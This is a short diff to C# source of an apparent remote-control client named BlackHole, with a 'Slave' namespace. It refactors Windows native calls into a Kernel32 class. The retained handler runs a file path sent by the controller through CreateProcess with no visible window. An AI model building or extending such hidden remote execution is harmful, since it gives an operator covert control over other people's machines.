@@ -1,6 +1,7 @@
 ﻿using BlackHole.Common;
 using BlackHole.Common.Network.Protocol;
 using BlackHole.Slave.Helper;
+using BlackHole.Slave.Helper.Native.Impl;
 using NetMQ;
 using System;
 using System.Collections.Concurrent;
@@ -12,7 +13,6 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using static BlackHole.Slave.Helper.NativeHelper.kernel32;
 
 namespace BlackHole.Slave
 {
@@ -448,16 +448,16 @@ namespace BlackHole.Slave
             ExecuteSimpleOperation(message.WindowId, -1, "File execution",
             () =>
             {
-                var si = new STARTUPINFO();
-                var pi = new PROCESS_INFORMATION();
-                var sap = new SECURITY_ATTRIBUTES();
-                var sat = new SECURITY_ATTRIBUTES();
+                var si = new Kernel32.STARTUPINFO();
+                var pi = new Kernel32.PROCESS_INFORMATION();
+                var sap = new Kernel32.SECURITY_ATTRIBUTES();
+                var sat = new Kernel32.SECURITY_ATTRIBUTES();
 
                 var directory = Path.GetDirectoryName(message.FilePath);
 
                 const uint CreateNoWindow = 0x08000000;
 
-                CreateProcess(message.FilePath, "", ref sap, ref sat, false, CreateNoWindow, IntPtr.Zero, directory, ref si, out pi);
+                Kernel32.CreateProcess(message.FilePath, "", ref sap, ref sat, false, CreateNoWindow, IntPtr.Zero, directory, ref si, out pi);
 
             }, message.FilePath);
         }
